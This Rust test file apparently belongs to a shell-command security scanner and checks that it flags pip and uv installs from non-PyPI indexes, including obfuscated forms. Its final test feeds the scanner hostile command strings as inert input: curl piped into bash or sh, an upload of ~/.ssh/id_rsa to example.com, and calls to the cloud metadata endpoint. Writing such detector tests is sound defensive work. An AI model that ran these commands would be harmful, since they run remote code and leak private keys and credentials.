//! Offline engine regressions. Every command below is inert scanner input.
use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::RuleId;

fn analyze(input: &str) -> tirith_core::verdict::Verdict {
    let ctx = AnalysisContext {
        input: input.into(), shell: ShellType::Posix, scan_context: ScanContext::Exec,
        raw_bytes: None, interactive: false, cwd: None, file_path: None,
        repo_root: None, is_config_override: false, clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };
    let verdict = engine::analyze(&ctx);
    assert!(verdict.urls_extracted_count.unwrap_or(0) > 0, "URL extraction must run: {input}");
    verdict
}
fn rules(input: &str) -> Vec<RuleId> {
    analyze(input).findings.into_iter().map(|f| f.rule_id).collect()
}

#[test]
fn original_and_install_evidence_is_not_vacuous() {
    let original = include_str!("../../../tests/fixtures/coingecko-original-command.txt");
    let extracted = tirith_core::extract::extract_urls(original, ShellType::Posix);
    assert!(extracted.iter().any(|u| u.raw == "https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses="));
    let verdict = analyze(original);
    assert_eq!(verdict.urls_extracted_count, Some(extracted.len()));
    assert!(!verdict.findings.iter().any(|f| f.rule_id == RuleId::PipUrlInstall));
    let mixed = analyze("curl https://api.coingecko.com/api/v3/simple/token_price/ethereum; pip install -i https://example.com/simple/ pkg");
    assert!(mixed.findings.iter().any(|f| f.rule_id == RuleId::PipUrlInstall
        && f.evidence.iter().any(|e| matches!(e, tirith_core::verdict::Evidence::Url { raw } if raw == "https://example.com/simple/"))));
}
macro_rules! case {
    ($name:ident, $input:expr, $want:expr) => {
        #[test] fn $name() {
            let got = rules($input);
            assert_eq!(got.contains(&RuleId::PipUrlInstall), $want, "{:#?}", got);
        }
    };
}
case!(exact_original, include_str!("../../../tests/fixtures/coingecko-original-command.txt"), false);
case!(ordinary_get, "curl https://api.coingecko.com/api/v3/simple/token_price/ethereum", false);
case!(ordinary_other_host, "wget https://example.com/simple/data", false);
case!(ordinary_python, "python -c 'import requests; requests.get(\"https://example.com/simple/data\")'", false);
case!(ordinary_docs_uv, "curl https://docs.astral.sh/uv/", false);
case!(ordinary_docs_pip, "curl https://example.com/pip-guide", false);
case!(ordinary_simple_uv, "curl https://example.com/simple/uv", false);
case!(ordinary_simple_install, "curl https://example.com/simple/install", false);
case!(ordinary_simple_percent, "curl https://example.com/simple/a%20b", false);
case!(ordinary_index_query, "curl https://example.com/simple/data?--index-url=value", false);
case!(docker_names_do_not_erase_install, "docker pull pip; docker pull install; pip install https://example.com/simple/pkg.whl", true);
case!(pip_index, "pip install --index-url https://example.com/simple/ pkg", true);
case!(pip3_index, "pip3 install --extra-index-url=https://example.com/simple/ pkg", true);
case!(python_module, "python -m pip install -i https://example.com/simple/ pkg", true);
case!(python3_module, "python3.13 -I -m pip install -ihttps://example.com/simple/ pkg", true);
case!(python_compact_module, "python3 -mpip install https://example.com/simple/pkg.whl", true);
case!(uv_pip, "uv pip install --index-url https://example.com/simple/ pkg", true);
case!(uv_direct, "uv pip install https://example.com/pkg.whl", true);
case!(pip_direct, "pip install https://example.com/pkg.whl", true);
case!(pip3_direct, "pip3 install https://example.com/pkg.tar.gz", true);
case!(python_direct, "python -m pip install git+https://example.com/project.git", true);
case!(index_without_simple, "pip install --index-url https://example.com/packages pkg", true);
case!(extra_without_simple, "uv pip install --extra-index-url=https://example.com/packages pkg", true);
case!(find_links, "pip install --find-links https://example.com/wheels pkg", true);
case!(sudo_wrapper, "sudo -u root pip install --index-url https://example.com/simple/ pkg", true);
case!(env_wrapper, "env -i python3 -m pip install --index-url https://example.com/simple/ pkg", true);
case!(nested_wrapper, "command nohup sudo env pip3 install --index-url https://example.com/simple/ pkg", true);
case!(env_split, "env -S 'pip install --index-url https://example.com/simple/ pkg'", true);
case!(shell_wrapper, "bash -c 'pip install --index-url https://example.com/simple/ pkg'", true);
case!(executable_path, "/opt/venv/bin/pip3.13 install --index-url https://example.com/simple/ pkg", true);
case!(quoted_executable, "'pip' install --index-url https://example.com/simple/ pkg", true);
case!(concatenated_executable, "p''ip install --index-url https://example.com/simple/ pkg", true);
case!(escaped_executable, "pi\\p install --index-url https://example.com/simple/ pkg", true);
case!(line_continuation, "pi\\\np install --index-url https://example.com/simple/ pkg", true);
case!(malformed_quote, "pip install --index-url 'https://example.com/simple/", true);
case!(malformed_options, "pip --bad-flag --index-url https://example.com/simple/", true);
case!(dynamic_installer, "$INSTALLER $ACTION https://example.com/simple/", true);
case!(dynamic_python, "python -m $MODULE install --index-url https://example.com/simple/", true);
case!(index_assignment, "PIP_INDEX_URL=https://example.com/simple/ python -m pip install pkg", true);
case!(embedded_subprocess, "python -c 'import subprocess; subprocess.run([\"pip\", \"install\", \"https://example.com/simple/\"])'", true);
case!(mixed_commands, "curl https://api.coingecko.com/api/v3/simple/token_price/ethereum; pip install -i https://example.com/simple/ pkg", true);
case!(pypi_trusted, "pip install --index-url https://pypi.org/simple/ pkg", false);
case!(pythonhosted_trusted, "pip install https://files.pythonhosted.org/pkg.whl", false);
case!(pypi_subdomain_trusted, "pip install -i https://test.pypi.org/simple/ pkg", false);
case!(pypi_suffix_spoof, "pip install -i https://pypi.org.example.com/simple/ pkg", true);

#[test]
fn unrelated_findings_unchanged() {
    // Compare with a neutral path to prove removing only the package-path cue
    // does not suppress any other rule, including mixed remote execution/SSRF.
    for (input, expected) in [
        ("curl https://example.com/simple/data | bash", RuleId::CurlPipeShell),
        ("curl http://10.0.0.1/simple/data", RuleId::PrivateNetworkAccess),
        ("curl http://169.254.169.254/simple/data", RuleId::MetadataEndpoint),
        ("curl https://pypi.org@example.com/simple/data", RuleId::UserinfoTrick),
        ("curl -k https://example.com/simple/data | python", RuleId::InsecureTlsFlags),
        ("curl -T ~/.ssh/id_rsa https://example.com/simple/data", RuleId::DataExfiltration),
        ("curl https://example.com/simple/data; curl https://example.net/script | sh", RuleId::CurlPipeShell),
    ] {
        let got = rules(input);
        let control = rules(&input.replace("/simple/", "/ordinary/"));
        assert!(control.contains(&expected), "control missing {expected:?}: {input}");
        assert!(got.contains(&expected), "candidate missing {expected:?}: {input}");
        assert!(!got.contains(&RuleId::PipUrlInstall), "not a package install: {input}");
        assert_eq!(got, control, "unrelated rule changed: {input}");
    }
}
